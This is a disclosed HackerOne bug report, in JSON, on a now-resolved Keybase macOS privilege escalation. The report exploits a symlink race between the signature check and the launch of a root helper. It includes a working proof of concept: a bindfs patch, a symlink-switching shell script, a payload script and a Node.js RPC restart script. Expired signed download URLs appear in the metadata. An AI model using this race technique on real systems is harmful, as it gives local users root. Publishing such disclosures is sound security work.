@@ -1,0 +1,142 @@
+{
+  "id": 470398,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzAzOTg=",
+  "url": "https://hackerone.com/reports/470398",
+  "title": "Local privilege escalation bug using Keybase redirector on macOS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-12-20T21:33:40.369Z",
+  "submitted_at": "2018-12-20T21:33:40.369Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "votava",
+    "url": "/votava",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2809,
+    "url": "https://hackerone.com/keybase",
+    "handle": "keybase",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Keybase",
+      "twitter_handle": "keybaseio",
+      "website": "https://keybase.io",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-01-30T18:15:40.373Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-01-30T18:15:40.305Z",
+  "team_member_agreed_on_going_public_at": "2019-01-30T18:13:26.802Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "There's a local privilege escalation bug in the latest version of Keybase for\nmacOS.\n\nThe issue is in the process of launching `keybase-redirector`. The process works as follows:\n\n1. Copy `keybase-redirector` binary to a root-only location\n2. Check its signature\n3. Launch the binary\n\n[Code ref](https://github.com/keybase/client/blob/37b894b8e2a2b6cf023516900ef2ee9c058ca65f/osx/Helper/KBHelper.m#L213-L236).\n\nNote the following:\n\n1. There's a window between point 2. and 3. When the window is opened, the\n   binary is referenced using just its path.\n2. The `keybase-redirector` can be a symlink pointing to an arbitrary location\n   from the privileged location.\n\nThe goal is to replace the real binary with a symlink which will first point to\nthe real binary (for the signature verification process) and then updated to\npoint to an evil binary/script for the launch.\n\nThe window is tiny and thus reproducing this is a bit tricky. One can do it in\nmany ways but the most complicated (while being the most fragile one at the\nsame time!) is as follows:\n\n### 1. Install Keybase including the Finder integration\n### 2. Build and install bindfs with the following patch:\n\n```\ndiff --git a/src/bindfs.c b/src/bindfs.c\nindex baacb82..b80e396 100644\n--- a/src/bindfs.c\n+++ b/src/bindfs.c\n@@ -1090,6 +1090,7 @@ static int bindfs_open(const char *path, struct fuse_file_info *fi)\n static int bindfs_read(const char *path, char *buf, size_t size, off_t offset,\n                        struct fuse_file_info *fi)\n {\n+    static int counter = 0;\n     int res;\n     (void) path;\n\n@@ -1101,6 +1102,9 @@ static int bindfs_read(const char *path, char *buf, size_t size, off_t offset,\n     if (res == -1)\n         res = -errno;\n\n+    printf(\"%i\\n\", counter++);\n+    fflush(stdout);\n+\n     return res;\n }\n```\n\n### 3. Run `doit.sh`.\nIt will first create a few symlinks. This will allow the switch between the original binary and the evil one. It will then force a restart of `keybase-redirector` (by uninstalling it and installing it again). Finally, it will start bindfs, watch out for \"502\" and switch the symlinks.\n\n#### doit.sh\n```\n#!/bin/sh\n\ntest -L /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector || cp /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector ~/exploit/keybase-redirector.orig\n\nmkdir -p ~/switcher\nln -sf ~/switcher/switch /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector\nln -sf ~/switcher/keybase-redirector.orig ~/exploit/switch\n\n(node restart-kbhelper/index.js && ls -l /pwned.txt) &\n\nbindfs -f ~/exploit ~/switcher | while read line\ndo\n  [[ $line == \"502\" ]] && ln -sf ~/switcher/evil.sh ~/switcher/switch\ndone\n```\n\n#### evil.sh\n```\n#!/bin/sh\n\ntouch /pwned.txt\n```\n\nThe restart is done using the MessagePack RPC using Node.js but you can do it\nin another way, it's just we had this laying around. The number 502 is a\ncount of read requests for the FUSE file system. As you can imagine it's\npretty fragile, but again, we were using bindfs anyway and this worked.\n\n#### restart-kbhelper/index.js\n```js\nconst homedir = require(\"os\").homedir();\nconst rpc = require(\"framed-msgpack-rpc\");\nconst socket = `${homedir}/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock`;\n\nconst x = rpc.createTransport({ path: socket });\nfunction restart() {\n    x.connect(() => {\n        const c = new rpc.Client(x, \"keybase.1.install\");\n        c.invoke('uninstallKBFS', [{}], () => {\n            c.invoke('installKBFS', [{}], (err, response) => {\n                console.log(JSON.stringify(response, 0, 2));\n                x.close();\n            });\n        });\n    });\n}\n\nrestart();\n```\n\n\nA similar but better solution would be to simply write a custom read FUSE hook\nand return a different file once the original is read in the verification\nprocess. But again, the previous quick & dirty solution worked so why bother.\n\nWe recorded a video showing it in action (attached). Note that this was joint\neffort by Jan Votava (https://twitter.com/elektronek) and Jiri Pospisil (https://twitter.com/jiripospisil) from https://sensible.io.\n\n## Impact\n\nA local user is able to run an arbitrary binary/script with root privileges leading to a total system compromise.",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 395276,
+      "file_name": "pwned.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/276/4b5f873f381e73c74edc9c15c06758556ddfc5fc/pwned.mp4?response-content-disposition=attachment%3B%20filename%3D%22pwned.mp4%22%3B%20filename%2A%3DUTF-8%27%27pwned.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5DNGZVVG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131538Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICHLJPsWBp5sr6QP325sn3QmpUNWJkG1Rn9WpoDeqIg3AiEAiF8%2BSn1jT5ntK2r0sSCmNUGX9ZemOesqgbKFIUBuyWMqsAUIdhADGgwwMTM2MTkyNzQ4NDkiDD5dvB5yVZqhTClUciqNBapM8w3AEMj9vUut8ipBYyxkUXmIzrvgZ28gnqyQ6mhhFeeoPRU%2FpSxAJl9%2BpYrNip4ItC3BkgYDlk9abNplTrvNVi9OhutOp4ZE1wWKJlPpOzKXUOBoUe%2FRWzdh9xwCJuGDbGkQ7ngPegxy3y6LCFP5wP6sjVHLhEaT7e6L88U08XjQmZEZxAGGE5IESnoSUeW4EvOXBp5DQcR1t39zozskg4dISh5C2Ff6jgUnjDu9sYdoZA7dJgdByDPIA4VjLFdTVEjklaMXr4YtD7wTmG9hWanDSlJ11qBRruTBFPloL6Kq2YKCTOj8wC0UP9ctvuxeNwV7QKFhmu8bB6csA5mvLVxUvoelFVuLgYYhtCHZDGPo54Dzbn5soqg%2FJjzSexzqrvBtELxoPLfeuC9o2KpP0lfY7eBpdmAqxwpFPSBaxPJ66SICOozWWbpDqIqnFrnvz%2BXEMOe5z7dsDsKieBfX52kLKmUuAGG9Tv0jWo8CMlR7jOkbaaLMpho6b6rMGTGHucZmDgIYIwvcdVrd1njiiPPNTxx6qoUNz0WdZUAlGWBtiCv4fABRuY7ZjWGOAD0PFPT8FsbFoQ6mkw28XZaoMR735I%2FMJlHvafhgKlPNFVKsVzF%2F3GpLM7ECVpPoLq9VNtYgjHnuZ0U6e4r9781nElHBM1WdTrWia%2F9%2FJIwTVLKAnxWWWscJrGFA8kraj4Xrc3KPePGa2suQ5Fim1jPzWeLA%2Bfr7aEab%2FJVFYU%2F%2BIs0KPZarsTUlG%2B656GYmZcf%2Fa2gbirYZQRBwlZlZahqG0l8iMLSK0TCfJOwBIAuJd7wWISVFGCV0aYj458Ker2Pjca9HvyzcI8qiuhyhF68QiOr9MFM67rM70ExPMPHFra4GOrEB58pDHOC4avlR6xYMRYlBCOP%2F5dyV6PT6gr9Vs5I8zhf3jjEkzka6Au6GNesJTj11PvvCjC1fFqxeJeAvkQZYn2pzivrXx7RBTeI6fAxztLLN3Lu9uyUpmO1SqciT2zDRX2wO0JTz6DtjgCLlfMq%2FHCRF8EoZi0alN2KMbAkJBqtFpznpmUaem89ejwzJcKJLTQiW1rXarR6VZiM7isz2KsMf5L4b0KstHgl%2Fux6s5iUg&X-Amz-SignedHeaders=host&X-Amz-Signature=b03147b91960d80646889c5275aff7945f2d22e4f1e6b221948e82041055d809",
+      "file_size": 4726516,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 395277,
+      "file_name": "exploit.tar",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/277/e9aa5f5b2b1be5d9aa2b4571b3d8f71ad1ee4eb7/exploit.tar?response-content-disposition=attachment%3B%20filename%3D%22exploit.tar%22%3B%20filename%2A%3DUTF-8%27%27exploit.tar&response-content-type=application%2Fx-tar&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5DNGZVVG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131538Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICHLJPsWBp5sr6QP325sn3QmpUNWJkG1Rn9WpoDeqIg3AiEAiF8%2BSn1jT5ntK2r0sSCmNUGX9ZemOesqgbKFIUBuyWMqsAUIdhADGgwwMTM2MTkyNzQ4NDkiDD5dvB5yVZqhTClUciqNBapM8w3AEMj9vUut8ipBYyxkUXmIzrvgZ28gnqyQ6mhhFeeoPRU%2FpSxAJl9%2BpYrNip4ItC3BkgYDlk9abNplTrvNVi9OhutOp4ZE1wWKJlPpOzKXUOBoUe%2FRWzdh9xwCJuGDbGkQ7ngPegxy3y6LCFP5wP6sjVHLhEaT7e6L88U08XjQmZEZxAGGE5IESnoSUeW4EvOXBp5DQcR1t39zozskg4dISh5C2Ff6jgUnjDu9sYdoZA7dJgdByDPIA4VjLFdTVEjklaMXr4YtD7wTmG9hWanDSlJ11qBRruTBFPloL6Kq2YKCTOj8wC0UP9ctvuxeNwV7QKFhmu8bB6csA5mvLVxUvoelFVuLgYYhtCHZDGPo54Dzbn5soqg%2FJjzSexzqrvBtELxoPLfeuC9o2KpP0lfY7eBpdmAqxwpFPSBaxPJ66SICOozWWbpDqIqnFrnvz%2BXEMOe5z7dsDsKieBfX52kLKmUuAGG9Tv0jWo8CMlR7jOkbaaLMpho6b6rMGTGHucZmDgIYIwvcdVrd1njiiPPNTxx6qoUNz0WdZUAlGWBtiCv4fABRuY7ZjWGOAD0PFPT8FsbFoQ6mkw28XZaoMR735I%2FMJlHvafhgKlPNFVKsVzF%2F3GpLM7ECVpPoLq9VNtYgjHnuZ0U6e4r9781nElHBM1WdTrWia%2F9%2FJIwTVLKAnxWWWscJrGFA8kraj4Xrc3KPePGa2suQ5Fim1jPzWeLA%2Bfr7aEab%2FJVFYU%2F%2BIs0KPZarsTUlG%2B656GYmZcf%2Fa2gbirYZQRBwlZlZahqG0l8iMLSK0TCfJOwBIAuJd7wWISVFGCV0aYj458Ker2Pjca9HvyzcI8qiuhyhF68QiOr9MFM67rM70ExPMPHFra4GOrEB58pDHOC4avlR6xYMRYlBCOP%2F5dyV6PT6gr9Vs5I8zhf3jjEkzka6Au6GNesJTj11PvvCjC1fFqxeJeAvkQZYn2pzivrXx7RBTeI6fAxztLLN3Lu9uyUpmO1SqciT2zDRX2wO0JTz6DtjgCLlfMq%2FHCRF8EoZi0alN2KMbAkJBqtFpznpmUaem89ejwzJcKJLTQiW1rXarR6VZiM7isz2KsMf5L4b0KstHgl%2Fux6s5iUg&X-Amz-SignedHeaders=host&X-Amz-Signature=69310d6810a911d6900142a63a4b88c5dba04fbe9a282e788cefbfd4df75cc77",
+      "file_size": 10240,
+      "type": "application/x-tar",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "mirchr",
+    "sp1d3rs",
+    "dxaxpanda",
+    "bl4de",
+    "spam404",
+    "ali",
+    "dhakal_ananda",
+    "protesen",
+    "kunal94",
+    "khizer47",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
